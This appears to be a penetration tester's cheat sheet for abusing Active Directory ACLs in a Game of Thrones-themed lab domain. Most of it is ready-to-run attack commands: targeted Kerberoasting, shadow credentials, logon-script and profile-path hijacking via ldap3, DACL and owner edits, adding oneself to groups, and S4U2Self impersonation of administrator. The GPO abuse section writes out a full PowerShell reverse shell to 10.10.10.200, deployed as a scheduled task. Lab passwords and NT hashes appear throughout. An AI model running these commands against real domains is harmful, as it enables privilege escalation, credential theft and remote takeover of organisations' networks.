# ACL

```sh
bloodhound-python -u hodor@north.sevenkingdoms.local -p hodor -c all --zip --dns-tcp -ns 10.10.10.11 -d sevenkingdoms.local
bloodhound-python -u hodor@north.sevenkingdoms.local -p hodor -c all --zip --dns-tcp -ns 10.10.10.11 -d north.sevenkingdoms.local
bloodhound-python -u hodor@north.sevenkingdoms.local -p hodor -c all --zip --dns-tcp -ns 10.10.10.11 -d essos.local
```

- when using kerberos authentication always remember to use FQDN
    ```sh
    # fails
    KRB5CCNAME=./tyron.lannister.ccache ldeep ldap -u tyron.lannister -k -d sevenkingdoms.local -s ldap://10.10.10.10 search '(sAMAccountName=tyron.lannister)'

    # success
    KRB5CCNAME=./tyron.lannister.ccache ldeep ldap -u tyron.lannister -k -d sevenkingdoms.local -s ldap://kingslanding.sevenkingdoms.local search '(sAMAccountName=tyron.lannister)'
    ```

- certipy shadow credentials does not work with kerberos auth (?)

## GenericWrite on User

- Target Kerberoasting
    ```sh
    git clone https://github.com/ShutdownRepo/targetedKerberoast
    targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p jaime --request-user joffrey.baratheon --dc-ip 10.10.10.10
    ```

- Shadow Credentials
    ```sh
    certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p jaime -account 'joffrey.baratheon' -dc-ip 10.10.10.10
    ```

- Logon Script
    ```sh
    ldeep ldap -u jaime.lannister -p 'jaime' -d sevenkingdoms.local -s ldap://10.10.10.10 search '(sAMAccountName=joffrey.baratheon)' scriptpath
    ```

    - python script to modify `scriptPath`
        ```py
        import ldap3
        dn = "CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local"
        user = "sevenkingdoms.local\\jaime.lannister"
        password = "jaime"
        server = ldap3.Server('kingslanding.sevenkingdoms.local')
        ldap_con = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)
        ldap_con.bind()
        ldap_con.modify(dn,{'scriptPath' : [(ldap3.MODIFY_REPLACE, '\\\\10.10.10.200\share\exploit.ps1')]})
        print(ldap_con.result)
        ldap_con.unbind()
        ```

    - python script to modify `profilePath`, then start `responder` to capture `NetNTLM` authentication when the user logs in
        ```py
        import ldap3
        dn = "CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local"
        user = "sevenkingdoms.local\\jaime.lannister"
        password = "jaime"
        server = ldap3.Server('kingslanding.sevenkingdoms.local')
        ldap_con = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)
        ldap_con.bind()
        ldap_con.modify(dn,{'profilePath' : [(ldap3.MODIFY_REPLACE, '\\\\10.10.10.200\share')]})
        print(ldap_con.result)
        ldap_con.unbind()
        ```

## WriteDacl

<https://github.com/ThePorgs/impacket>

```sh
dacledit-exegol.py -action 'read' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion' -dc-ip 10.10.10.10
dacledit-exegol.py -action 'write' -rights 'FullControl' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion' -dc-ip 10.10.10.10
dacledit-exegol.py -action 'restore' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion' -dc-ip 10.10.10.10 -file ./dacledit-20240128-210948.bak
```

## AddSelf

```sh
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.10.10.10 search '(sAMAccountName=tyron.lannister)' distinguishedName | jq '.[].dn'
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.10.10.10 search '(sAMAccountName=Small Council)' distinguishedName | jq '.[].dn'
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.10.10.10 add_to_group  "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=Small Council,OU=Crownlands,DC=sevenkingdoms,DC=local"'
```

## AddMember

```sh
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.10.10.10 search '(sAMAccountName=tyron.lannister)' distinguishedName | jq '.[].dn'
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.10.10.10 search '(sAMAccountName=dragonstone)' distinguishedName | jq '.[].dn'
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.10.10.10 add_to_group  "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=DragonStone,OU=Crownlands,DC=sevenkingdoms,DC=local"
```

## WriteOwner

1. Change ownership of a group
    ```sh
    owneredit-exegol.py -action read -target 'kingsguard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
    owneredit-exegol.py -action 'write' -new-owner 'tyron.lannister' -target 'kingsguard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
    ```

2. As an owner of a group, we have `WriteDacl` permissions on the group
    ```sh
    dacledit-exegol.py -action 'write' -rights 'FullControl' -principal 'tyron.lannister' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' -target 'kingsguard' 'sevenkingdoms.local'/'tyron.lannister' -dc-ip 10.10.10.10
    ```

3. do `AddSelf`
    ```sh
    ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.10.10.10 search '(sAMAccountName=tyron.lannister)' distinguishedName | jq '.[].dn'
    ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.10.10.10 search '(sAMAccountName=kingsguard)' distinguishedName | jq '.[].dn'
    ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.10.10.10 add_to_group  "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=KingsGuard,OU=Crownlands,DC=sevenkingdoms,DC=local"
    ```

## GenericAll on User

Same as `GenericWrite`

## GenericAll on Computer

1. Shadow Credentials to get the computer TGT and NT hash
    ```sh
    certipy shadow auto -u stannis.baratheon@sevenkingdoms.local -hashes ':d75b9fdf23c0d9a6549cff9ed6e489cd' -account 'kingslanding$' -dc-ip 10.10.10.10
    ```

2. S4U2Self to obtain service ticket (administrator -> kingslanding$)
    ```sh
    KRB5CCNAME=./kingslanding.ccache getST-exegol.py -self -altservice 'cifs/kingslanding.sevenkingdoms.local' -impersonate administrator -k -no-pass -dc-ip 10.10.10.10 sevenkingdoms.local/'kingslanding$'
    ```

## GPO Abuse

- `WriteDacl`, `WriteOwner`, `GenericWrite` on GPO
- <https://github.com/Hackndo/pyGPOAbuse>

```sh
# gpo id obtained from bloodhound:
# Node Info -> Node Properties -> GPO File Path (\\NORTH.SEVENKINGDOMS.LOCAL\SYSVOL\NORTH.SEVENKINGDOMS.LOCAL\POLICIES\{53136A49-0492-4A3E-A45E-5D762E4CF8FF})
python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "53136A49-0492-4A3E-A45E-5D762E4CF8FF"
python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' \
    -gpo-id "53136A49-0492-4A3E-A45E-5D762E4CF8FF" \
    -f \
    -powershell \
    -command "\$c = New-Object System.Net.Sockets.TCPClient('10.10.10.200',443);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){    \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);    \$sb = (iex \$d 2>&1 | Out-String );    \$sb = ([text.encoding]::ASCII).GetBytes(\$sb + 'ps> ');    \$s.Write(\$sb,0,\$sb.Length);    \$s.Flush()};\$c.Close()" \
    -taskname "MyTask" -description "don't worry"
```

## Read LAPS Password

```sh
# Although bloodhound points to 10.10.10.23 computer, the target argument is still the DC ip
nxc ldap 10.10.10.12 -u jorah.mormont -p 'H0nnor!' --module laps
```

